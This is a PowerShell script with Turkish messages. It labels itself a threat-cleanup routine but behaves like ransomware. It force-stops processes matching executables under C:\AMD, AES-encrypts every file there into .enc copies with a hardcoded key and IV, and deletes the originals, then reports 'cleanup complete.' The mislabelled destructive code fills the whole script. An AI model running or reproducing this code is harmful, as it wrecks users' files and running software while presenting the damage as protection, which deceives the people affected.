Write-Host "=== Tehdit Temizleme İşlemi Başladı ==="

$TargetDir = "C:\AMD"
$Key = (1..32)
$IV = (1..16)

# AES oluştur
$AES = [System.Security.Cryptography.Aes]::Create()
$AES.Key = $Key
$AES.IV = $IV
$Encryptor = $AES.CreateEncryptor()

# 1. Tüm exe dosyalarını bul
Write-Host "Dosyalar taranıyor: $TargetDir ..."
$ExeFiles = Get-ChildItem -Path $TargetDir -Recurse -Include *.exe -ErrorAction SilentlyContinue

if ($ExeFiles.Count -eq 0) {
    Write-Host "⚠️ Hiç exe dosyası bulunamadı."
} else {
    Write-Host "$($ExeFiles.Count) adet exe bulundu."
}

# 2. Çalışan exe proseslerini durdur
foreach ($Exe in $ExeFiles) {
    $ProcName = [System.IO.Path]::GetFileNameWithoutExtension($Exe.Name)
    try {
        $Processes = Get-Process -Name $ProcName -ErrorAction SilentlyContinue
        if ($Processes) {
            $Processes | Stop-Process -Force
            Write-Host "✅ Proses durduruldu: $ProcName"
        } else {
            Write-Host "⚠️ Çalışan proses bulunamadı: $ProcName"
        }
    } catch {
        Write-Host "❌ Proses kapatılırken hata oluştu: $ProcName"
    }
}

# 3. Tüm dosyaları şifrele
$AllFiles = Get-ChildItem -Path $TargetDir -Recurse -File -ErrorAction SilentlyContinue
foreach ($File in $AllFiles) {
    try {
        $EncPath = "$($File.FullName).enc"
        $In = [System.IO.File]::OpenRead($File.FullName)
        $Out = [System.IO.File]::Create($EncPath)
        $Crypto = New-Object System.Security.Cryptography.CryptoStream($Out,$Encryptor,"Write")
        $In.CopyTo($Crypto)
        $Crypto.Close(); $In.Close(); $Out.Close()
        Write-Host "🔐 Şifrelendi: $($File.FullName)"
    } catch {
        Write-Host "❌ Şifreleme hatası: $($File.FullName)"
    }
}

# 4. Orijinal dosyaları sil
foreach ($File in $AllFiles) {
    try {
        Remove-Item $File.FullName -Force
        if (-not (Test-Path $File.FullName)) {
            Write-Host "✅ Silindi: $($File.FullName)"
        } else {
            Write-Host "⚠️ Silinemedi: $($File.FullName)"
        }
    } catch {
        Write-Host "❌ Silme hatası: $($File.FullName)"
    }
}

Write-Host "=== Temizlik işlemi tamamlandı ==="
